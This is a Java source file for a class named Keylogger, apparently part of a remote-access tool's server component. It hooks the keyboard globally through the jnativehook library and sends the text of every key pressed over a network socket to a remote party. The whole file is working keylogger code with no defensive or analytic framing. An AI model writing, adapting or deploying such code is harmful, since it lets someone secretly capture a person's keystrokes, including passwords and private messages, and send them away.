package Server;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import General.Commands;

public class Keylogger implements NativeKeyListener,Runnable {
	
	private Socket socket = null;
	private DataOutputStream dataOutputStream = null;
	
	public Keylogger(Socket socket) throws IOException {
		this.setSocket(socket);
		dataOutputStream = new DataOutputStream(socket.getOutputStream());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		System.out.println("Key pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
		try {
			dataOutputStream.writeInt(Commands.PRESS_KEY_KEYLOGGER.getAbbrev());
			dataOutputStream.writeUTF(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
			dataOutputStream.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		System.out.println("Key released: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		System.out.println("Hello world");
		
		try {
			GlobalScreen.registerNativeHook();
		} catch(NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(this);
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}
}
